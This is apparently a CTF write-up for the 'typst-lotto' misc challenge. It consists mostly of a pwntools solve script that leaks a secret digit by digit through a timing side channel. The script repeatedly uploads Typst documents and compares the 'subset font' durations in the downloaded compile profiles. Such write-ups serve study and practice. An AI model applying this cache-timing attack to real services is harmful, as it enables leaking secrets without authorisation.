---
type: challenge
event: glacier
name: typst-lotto
category: misc
note: "[[Random#Typst]]"
solved: ✅
---
Timing attack because typst cache compile.

```python
built_counter = -1

ADMIN_DOCUMENT = """
{input1}{input2}
"""

def upload(n: int, j: int):
    global built_counter
    d = ADMIN_DOCUMENT.format(input1=j,input2=n).encode()
    io.sendlineafter(b"[>] Choose an option:", str(1).encode())
    enc = base64.b64encode(d)
    io.sendlineafter(b"--- BASE64 INPUT START ---", enc)
    io.sendline(b"@")
    io.recvuntil(b"--- BASE64 INPUT END ---")
    io.recvuntil(b"Document built")
    built_counter += 1

def download():
    global built_counter
    dfile = f"profile/{built_counter}.json".encode()
    io.sendlineafter(b"[>] Choose an option:", str(2).encode())
    io.sendlineafter(b"[>] Choose a file to download", dfile)
    io.recvuntil(b"[+] --- " + dfile + b" OUTPUT START ---")
    out = io.recvuntil(b"[+] --- " + dfile + b" OUTPUT END ---")
    out = out.split(b"[+]")[0].decode()
    j = json.loads(out)
    io.recvuntil(b"[+] Menu")
    return j, out

def extract_subset_font(j):
    # Cached file by hash
    if len(j) < 42:
        return 0

    s1 = j[41]
    assert(s1['name'] == 'subset font')
    assert(s1['ph'] == 'B')
    s2 = j[42]
    assert(s2['name'] == 'subset font')
    assert(s2['ph'] == 'E')
    dif = float(s2['ts']) - float(s1['ts'])
    return round(dif, 3)

def cont():
    io.sendlineafter(b"3. Continue", b"3")

def lt(num):
    return (num < 100) and (num > 0)

DIFFICULTY = 15
space = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
io = None

def exploit():
    global built_counter
    global io
    built_counter = -1
    io = start()

    for i in range(DIFFICULTY):
        built_counter += 2
        log.info(f"Iteration {i} of {DIFFICULTY}")
        guess = {}
        for s in space:
            upload(s, i)
            j, d = download()
            t = extract_subset_font(j)
            guess[s] = t
            print(f"  {s}: {t}")

        if min(guess.values()) > 100 or len(list(filter(lt,guess.values()))) > 1:
            log.warn("Restarting... results no bueno")
            io.close()
            exploit() # brrr ez restart

        cont()

        m = min(guess, key=guess.get)
        log.success(f"Guessed character is {m}")

        io.sendlineafter(b"[>] Take a guess: ", str(m).encode())
        io.recvuntil(b"[+] Keep going...")

    f = find_flag(io.recvall(timeout=5))
    if f is not None:
        log.success(f)
        exit(0)
    else:
        exit(1)

exploit()
```